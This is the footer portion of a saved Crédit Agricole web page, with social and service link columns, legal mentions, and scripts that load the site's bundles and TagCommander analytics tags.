        <img class="img-responsive" alt="Page Facebook" src="images/social_buttons/facebook.png" width="20"/>
    </span>
</a>

</span>
<span class="button-twitter button-template section">










<a href="#" target="_blank" class="TopFooterSocial-Links" aria-label="aller sur la page Twitter" data-trackingclass="Clic-Twitter">
    <span class="TopFooterSocial-imgSocial icon">
        <img class="img-responsive" alt="Page Twitter" src="images/social_buttons/twitter.png" width="20"/>
    </span>
</a>

</span>
<span class="button-video button-template section">










<a href="#" target="_blank" class="TopFooterSocial-Links" aria-label="aller sur la page Youtube" data-trackingclass="Clic-Youtube ">
    <span class="TopFooterSocial-imgSocial icon">
        <img class="img-responsive" alt="Page Youtube" src="images/social_buttons/video.png" width="20"/>
    </span>
</a>

</span>
<span class="button-photo button-template section">










<a href="#" target="_blank" class="TopFooterSocial-Links" aria-label="aller sur la page Instagram" data-trackingclass="Clic-Instagram">
    <span class="TopFooterSocial-imgSocial icon">
        <img class="img-responsive" alt="Page Instagram" src="images/social_buttons/photo.png" width="20"/>
    </span>
</a>

</span>

</div>

			
		
		
	
</div>



<div class="MidFooterLink">
	<div class="MidFooterLink-SubCategory">
		
			
				
					<div class="logo-footer parbase">











<img src="images/autre/images/LogoCAblanc.svg" alt="<h2>#</h2>" class="MidFooterLink-CaLogo"/></div>

				
			
			
		
	</div>

	<div class="MidFooterLink-SubCategory">
		
			
				
					<div class="footer-groupe-col-1 c061_footer_banque parbase">












<div class="MidFooterLink-SubCategoryTitle msl-mr-xs">
    <h3 class="MidFooterLink-SubCategoryTitleTag" style="color:inherit;"><p>VOTRE BANQUE</p>
</h3>
    <span class="icon npc-arrow-down MidFooterLink-Chevrons"></span>
</div>
<div class="MidFooterLink-SubCategoryBlocLinks">
	
		
            
                
    				
    				<a href="#" class="MidFooterLink-SubCategoryLink msl-mb-2xs" target="_self">Banque coopérative</a>
                
            
            
        
	
		
            
                
    				
    				<a href="#" class="MidFooterLink-SubCategoryLink msl-mb-2xs" target="_self">Espace sociétaire</a>
                
            
            
        
	
		
            
                
    				
    				<a href="#" class="MidFooterLink-SubCategoryLink msl-mb-2xs" target="_self">Charte éthique</a>
                
            
            
        
	
		
            
                
    				
    				<a href="#" class="MidFooterLink-SubCategoryLink msl-mb-2xs" target="_blank">Groupe CA</a>
                
            
            
        
	
		
            
                
    				
    				<a href="#" class="MidFooterLink-SubCategoryLink msl-mb-2xs" target="_blank">Recrutement</a>
                
            
            
        
	
</div></div>

				
			
			
		
	</div>

	<div class="MidFooterLink-SubCategory">
		
			
				
					<div class="footer-groupe-col-2 c061_footer_banque parbase">












<div class="MidFooterLink-SubCategoryTitle msl-mr-xs">
    <h3 class="MidFooterLink-SubCategoryTitleTag" style="color:inherit;"><p>RELATION BANQUE CLIENT<br>
</p>
</h3>
    <span class="icon npc-arrow-down MidFooterLink-Chevrons"></span>
</div>
<div class="MidFooterLink-SubCategoryBlocLinks">
	
		
            
                
    				
    				<a href="#" class="MidFooterLink-SubCategoryLink msl-mb-2xs" target="_self">Réclamation et médiation</a>
                
            
            
        
	
		
            
                
    				
    				<a href="#" class="MidFooterLink-SubCategoryLink msl-mb-2xs" target="_self">Tarifs</a>
                
            
            
        
	
		
            
                
    				
    				<a href="#" class="MidFooterLink-SubCategoryLink msl-mb-2xs" target="_self">Informations réglementaires</a>
                
            
            
        
	
		
            
                
    				
    				<a href="#" class="MidFooterLink-SubCategoryLink msl-mb-2xs" target="_self">Fonds de Garantie des Dépôts et de Résolution (FGDR)</a>
                
            
            
        
	
		
            
                
    				
    				<a href="#" class="MidFooterLink-SubCategoryLink msl-mb-2xs" target="_self">Sites des Caisses Régionales</a>
                
            
            
        
	
</div></div>

				
			
			
		
	</div>

	<div class="MidFooterLink-SubCategory">
		
			
				
					<div class="footer-groupe-col-3 footer-double-colonne parbase">












<div class="MidFooterLink-SubCategoryTitle msl-mr-xs">
	<h3 class="MidFooterLink-SubCategoryTitleTag" style="color:inherit;">
        <p>SITES SPECIALISES&nbsp;<br>
</p>

    </h3>
	<span class="icon npc-arrow-down MidFooterLink-Chevrons"></span>
</div>
<div class="MidFooterLink-SubCategoryBlocLinks">
	<div class="MidFooterLink-SubCategoryLinks">
		


					
						
						<a href="#" class="MidFooterLink-SubCategoryLink msl-mb-2xs" target="_blank">Prêt immobilier en ligne</a>
					

		


					
						
						<a href="#" class="MidFooterLink-SubCategoryLink msl-mb-2xs" target="_blank">Ouverture de compte Eko</a>
					

		


					
						
						<a href="#" class="MidFooterLink-SubCategoryLink msl-mb-2xs" target="_blank">Agences immobilières Square Habitat</a>
					

		


					
						
						<a href="#" class="MidFooterLink-SubCategoryLink msl-mb-2xs" target="_blank">Service de télésurveillance</a>
					

		


					
						
						<a href="#" class="MidFooterLink-SubCategoryLink msl-mb-2xs" target="_blank">Réseau professionnel Youzful</a>
					

		
	</div>
	<div class="MidFooterLink-SubCategoryLinks">
		


					
						
						<a href="#" class="MidFooterLink-SubCategoryLink msl-mb-2xs" target="_blank">CA Immobilier</a>
					

		


					
						
						<a href="#" class="MidFooterLink-SubCategoryLink msl-mb-2xs" target="_blank">Création d’entreprise</a>
					

		


					
						
						<a href="#" class="MidFooterLink-SubCategoryLink msl-mb-2xs" target="_blank">Partenariats sportifs</a>
					

		


					
						
						<a href="#" class="MidFooterLink-SubCategoryLink msl-mb-2xs" target="_blank">Talents Gourmands</a>
					

		


					
						
						<a href="#" class="MidFooterLink-SubCategoryLink msl-mb-2xs" target="_blank">Pleinchamp.com</a>
					

		
	</div>
</div>
</div>

				
			
			
		
	</div>

	<div class="MidFooterLink-SubCategory MidFooterLink-SubCategorysBorder">
		
			
				
					<div class="footer-accessibilite parbase">











<div class="MidFooterLink-SubCategoryTitle msl-mr-xs">
	<h3 class="MidFooterLink-SubCategoryTitleTag" style="color:inherit;">
		<p>Accessibilité numérique du site</p>

	</h3>
	<span class="icon npc-arrow-down MidFooterLink-Chevrons"></span>
</div>

<div class="MidFooterLink-SubCategoryBlocLinks">
	<p class="MidFooterLink-MalEntendantLogo">
		<img src="print/settings/wcm/designs/ca/npc/clientlib-resources/resources/images/commun/mal-entendant.png" alt="ear" tabindex="0" class="tabindexable"/>
    </p>
	
	
		
			
				
					<a href="#" target="_blank" class="MidFooterLink-MalEntendantLink"> Accessibilité</a>
				
			
			
		
	
</div>
</div>

				
			
			
		
	</div>
</div>



<div class="LowFooterMention">
	<div class="LowFooterMention-BlocLinks">
		<input name="language" value="fr" type="hidden" />

		
			
				
					<div class="footer-mentions parbase">










	









<a href="#" class="LowFooterMention-Links LowFooterMention-FirstLink" target="_self">
	<div class="label1 texteSimple">






<div>
    MENTIONS LÉGALES
</div></div>

</a>
<a href="#" class="LowFooterMention-Links" target="_self">
	<div class="label2 texteSimple">






<div>
    PROTECTION DES DONNÉES PERSONNELLES
</div></div>

</a>
<a href="#" class="LowFooterMention-Links" target="_self">
	<div class="label3 texteSimple">






<div>
    
</div></div>

</a>
<a href="#" class="LowFooterMention-Links" target="_self">
	<div class="label4 texteSimple">






<div>
    SÉCURITÉ
</div></div>

</a>

	
		<a href="javascript:tC.privacyCenter.showPrivacyCenter();" class="LowFooterMention-Links" target="_self">
			<div class="label5 texteSimple">






<div>
    Cookies
</div></div>

		</a>
	
	



	
	
		<span class="LowFooterMention-Links">© Crédit Agricole</span>
	

</div>

				
			
			
		
	</div>
</div>


		    </div>
	    </footer>
	


	

	
	<script src="print/settings/wcm/designs/ca/npc/clientlib-npc-components.min.b6efd65ae8c18d73875a5e228a1dc167.js"></script>

	








<script src="print/settings/wcm/designs/ca/npc/clientlibPageProduit.min.d70b9a47b6dadcb81fc4cc9eb8728693.js"></script>


	
	    
	        
	        
         		<script src="print/settings/wcm/designs/ca/npc/clientlib-google-map.min.87a76470d686bc99a65e1f582ee93f13.js"></script>
<script src="print/settings/wcm/designs/ca/npc/clientlibBoutonVertGeneralVitrine.min.6d249ff421b187a168e04f64e3949080.js"></script>

	        
	  


<script>

    	// First header h1
    	var tc_vars = tc_vars || {};
        tc_vars.page_entete_H1 = '';
        for(var i=0;i<jQuery('h1').length;i++) {
			tc_vars.page_entete_H1 = jQuery('h1').get(i).textContent.trim();
            if(tc_vars.page_entete_H1 !== '') {break;}
        }
        
        if(ContextHub != null) {
    		var deviceStore = ContextHub.getStore("surferinfo");
    		deviceStore.eventing.on(ContextHub.Constants.EVENT_STORE_READY, function() {
    			var categoryDevice = deviceStore.getItem("/device").category;
    			if (categoryDevice === 'Desktop')
    				categoryDevice = 'Ordinateur';
    			else if (categoryDevice === 'Tablet')
    				categoryDevice = 'Tablette';
    			tc_vars.utilisateur_device = categoryDevice;
    	    });
    	}

        callCreerConteneurTagCmd();
        
        function callCreerConteneurTagCmd() {
        	
        	
            if(true && !false) {

                if(true && true) {
    				creerElementScript("../cdn.tagcommander.com/3315/tc_PortailClientCreditAgricole_2.js", "async");
                } else if(true) {
    				creerElementScript("../cdn.tagcommander.com/3315/uat/tc_PortailClientCreditAgricole_2.js", "async");
                }

                if(true && false) {
    				creerElementScript("../cdn.tagcommander.com/3315/tc_CreditAgricoleCRSitemaitre_6.js", "async");
                } else if(false) {
    				creerElementScript("../cdn.tagcommander.com/3315/uat/tc_CreditAgricoleCRSitemaitre_6.js", "async");
                }
                
                if(true && true) {
    				creerElementScript("../cdn.tagcommander.com/3315/tc_PortailClientCreditAgricole_4.js", "async");
                } else if(true) {
    				creerElementScript("../cdn.tagcommander.com/3315/uat/tc_PortailClientCreditAgricole_4.js", "async");
                }
            }
            
            
        }

        function creerElementScript(url, isAsync) {
            var eltScript = document.createElement('script');
            eltScript.type = "text/javascript";
    		eltScript.src = url;
            eltScript.async = (isAsync == "async") ? true : false;
            document.getElementsByTagName('body')[0].appendChild(eltScript);
        }

</script>
    
    
   


   

</body>

</html>